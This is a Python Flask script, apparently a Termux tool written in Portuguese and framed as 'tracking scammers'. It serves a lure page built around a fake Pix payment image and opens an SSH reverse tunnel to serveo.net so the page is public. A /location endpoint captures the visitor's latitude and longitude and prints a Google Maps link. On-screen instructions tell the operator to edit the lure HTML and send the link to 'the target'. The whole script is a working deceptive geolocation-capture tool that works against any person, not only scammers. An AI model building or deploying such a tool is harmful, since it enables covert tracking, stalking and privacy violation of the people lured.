# -*- coding: utf-8 -*-
from flask import Flask, request, render_template, jsonify
import time
import subprocess
import threading
from colorama import Fore, Style, init
import os
import re

# Inicializa o Colorama
init(autoreset=True)

app = Flask(__name__)

# Função para limpar a tela do terminal
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Função que mostra a animação de rastreamento
def loading_animation():
    map_representation = [
        "---------------------------------\n",
        "|        Mapa                  |\n",
        "|                              |\n",
        "|     Ponto de Rastreio        |\n",
        "|                              |\n",
        "| " + Fore.RED + "Golpista 1 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 2 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 3 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 4 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 5 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 6 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 7 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 8 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 9 Detectado!" + Style.RESET_ALL + "        |\n",
        "| " + Fore.RED + "Golpista 10 Detectado!" + Style.RESET_ALL + "       |\n",
        "|------------------------------|\n"
    ]

    tracking_symbols = ['*', '*', '*', '*']

    for i in range(20):  # Duração da animação
        clear_screen()
        print(Fore.YELLOW + "Rastreando golpistas: " + tracking_symbols[i % len(tracking_symbols)] * (i % 4 + 1) + Style.RESET_ALL)
        print("".join(map_representation))

        if i % 4 == 0 and i != 0:
            print(Fore.RED + "Alerta: Golpista " + str(i // 4) + " detectado! Ação necessária!" + Style.RESET_ALL)

        time.sleep(0.5)  # Intervalo entre os frames

# Função para mostrar o ASCII Art de caveira
def display_scary_skull():
    scary_skull_art = [
        "      " + Fore.RED + ".-~~~~~~~-.      " + Style.RESET_ALL,
        "    " + Fore.YELLOW + ".`    _    _ `.    " + Style.RESET_ALL,
        "   " + Fore.YELLOW + "/    _ (o)  (o) \\   MODIFIQUE HTML COLOCADO FOTO DO PIX FALSO " + Style.RESET_ALL,
        "  " + Fore.GREEN + "|      |   __|__  |   OU OUTRA COISA DO HTML PARA ENGANAR GOLPISTA " + Style.RESET_ALL,
        "  " + Fore.GREEN + "|      |   |  |   |  QUANDO GOLPISTA PERMITIR ACHAR LOCAL VC VERA  " + Style.RESET_ALL,
        "   " + Fore.RED + "\\     `-.__.-'   /   ONDE MAIS OU MENOS ELE ESTA..... " + Style.RESET_ALL,
        "    " + Fore.RED + "`._           _.'    " + Style.RESET_ALL,
        "       " + Fore.RED + "`~~~~~~~~~`        " + Style.RESET_ALL,
        "                         ",
        "     " + Fore.MAGENTA + " TERMUX RASTREIE GOLPISTAS" + Style.RESET_ALL,
        "     " + Fore.CYAN + "O perigo esta a espreita!" + Style.RESET_ALL
    ]
    
    for line in scary_skull_art:
        print(line)
    print(Fore.GREEN + "ESCOLHAR UM DESSES ")
    print(Fore.MAGENTA + "AVISO:PARA COLOCAR ALGUMA FOTO DO LINK, VAÍ PARA TEMPLATES E DA COMADO edit  do FOTOPIX.html PARA COLOCAR FOTOS ENTRA E PROCURA EM <img src="" COLOCAR IMAGEM LAR MAIS DEIXE IMAGEM DENTRO EM TEMPLATE E VAII DA HTML E COLOCAR EM <img src="" LAR DENTRO ASSIM NOME DA SUA IMAGEM PIX.JPG POR EXEMPLO, HÁ TÁ BÉM QUALDO GOLPISTA BURRO PERMITIR QUE SITE PEGAR LOCALIZAÇÃO VAI GERA UM LINK LAR EM  BAIXO MAIS OU MENOS ASSIM GOOGLE_LINK: AQUI ESTARA O LINK", end=' ') 
   
    
    # Adiciona o input após a arte da caveira
    user_choice = input(Fore.RED + f"\n\n  VC QUE LOCALIZAR GOLPISTA: ")
    return user_choice  # Retorna a escolha do usuário

# Função Flask para a página inicial
@app.route('/')
def index():
    return render_template('FOTOPIX.html')  # Substitua pelo seu template principal

# Função Flask para capturar a localização
@app.route('/location', methods=['POST'])
def get_location():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if latitude and longitude:
        # Gera o link do Google Maps com as coordenadas
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

        # Exibe o link no console do servidor e permanece visível
        print(f"\nLink do Google Maps: {google_maps_link}\n")
        return jsonify({
            "status": "Localização capturada",
            "maps_link": google_maps_link
        })

# Função para criar o túnel SSH
def create_ssh_tunnel():
    print(Fore.RED + "TUNEL PARA DEIXAR PUBLICO o LINK  PEGA O LINK VERDE PARA EM BAIXO DO CRT + R REDE EXTERNA!!!!!..." + Style.RESET_ALL)
    local_host = 'localhost'
    local_port = 5000
    serveo_command = f"ssh -R 80:{local_host}:{local_port} serveo.net"

    # Inicia o túnel e captura a saída
    process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while True:
        output = process.stdout.readline()
        if output == b"" and process.poll() is not None:
            break
        if output:
            output = output.decode().strip()
            print(output)  # Para depuração

            # Verifica se o link do túnel foi gerado
            match = re.search(r'Forwarding (http://\S+)', output)
            if match:
                tunnel_link = match.group(1)
                print(Fore.RED + "TUNEL LINK ATIVO DA REDE EXTERNA MANDA PARA O ALVO EM BAIXO..." + Style.RESET_ALL)
                print(Fore.GREEN + f"TUNEL SSH criado com sucesso! Acesse em: {tunnel_link}" + Style.RESET_ALL)
                break
            elif "error" in output.lower():  # Exibe erros se ocorrerem
                print(Fore.RED + "Erro ao criar tunel: " + output + Style.RESET_ALL)

# Função principal
def main():
    # 1. Executa a animação de rastreamento uma única vez
    loading_animation()

    # 2. Mostra a caveira ASCII Art e captura a escolha do usuário
    user_choice = display_scary_skull()

    # 3. Mensagem personalizada antes de iniciar o Flask
    print(Fore.GREEN + "\n--- Iniciando o servidor Flask ---" + Style.RESET_ALL)

    # Cria o túnel SSH em uma thread separada
    ssh_thread = threading.Thread(target=create_ssh_tunnel)
    ssh_thread.start()

    # Inicia o servidor Flask
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == "__main__":
    main()
